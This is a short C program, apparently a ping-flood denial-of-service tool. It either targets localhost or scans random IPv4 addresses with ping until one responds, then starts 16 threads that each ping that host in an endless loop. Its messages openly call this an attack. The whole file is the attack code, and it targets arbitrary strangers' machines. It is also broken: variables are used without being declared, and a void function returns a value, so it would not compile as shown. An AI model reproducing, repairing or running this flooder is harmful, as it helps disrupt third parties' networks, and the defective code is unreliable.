#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<time.h>
#include<pthread.h>
#include<unistd.h>

int creatIp(char *ip);
int effect(char ip[16]);
void attack(void* args);

int creatIp(char *ip){
char part[4][4];
time_t t;
int i;
//初始化随机数产生器
srand((unsigned)time(&t));


for(i=0;i<4;i++){
sprintf(part[i],"%d",rand()%255);
strcat(ip,part[i]);
if(i!=3)
strcat(ip,".");
}
return strlen(ip);
}

int effect(char ip[16]){
char commond[100]="ping -c 1 -w 1 ";
char temp[100000];
int i;
strcat(commond,ip);
printf("%s\n",commond);
if(system(commond)==0)
return 1;
return 0;
}

void attack(void* args){
char temp[1000];
while(1){
system(commond);
}
return NULL;
}

int main(){
char ch;
int i,ret;
pthread_t T[16];
printf("choice attack model : a(default) for 127.0.0.1 ; b for rand ip\n");
scanf("%c",&ch);
if (ch=='b'){
printf("seraching for the effective ipv4 address...\n");
while(1){
creatIp(ip);
if (effect(ip)==1){
printf("find %s\ngive me a five!",ip);
getchar();
getchar();
break;
}
printf("%s is not an effective ipv4 address\n",ip);
ip[0]='\0';
}
}
else{
strcat(ip,"127.0.0.1");
}
strcat(commond,ip);
//strcat(commond,pwd);
printf("attack model:%s\n",commond);
for(i=0;i<16;i++){
ret=pthread_create(T+i,NULL,attack,NULL);
if (ret==0){
printf("%d thread creat succsess\n",i);
continue;
}
else{
return 0;
}
}
sleep(10000000);
return 0;
}

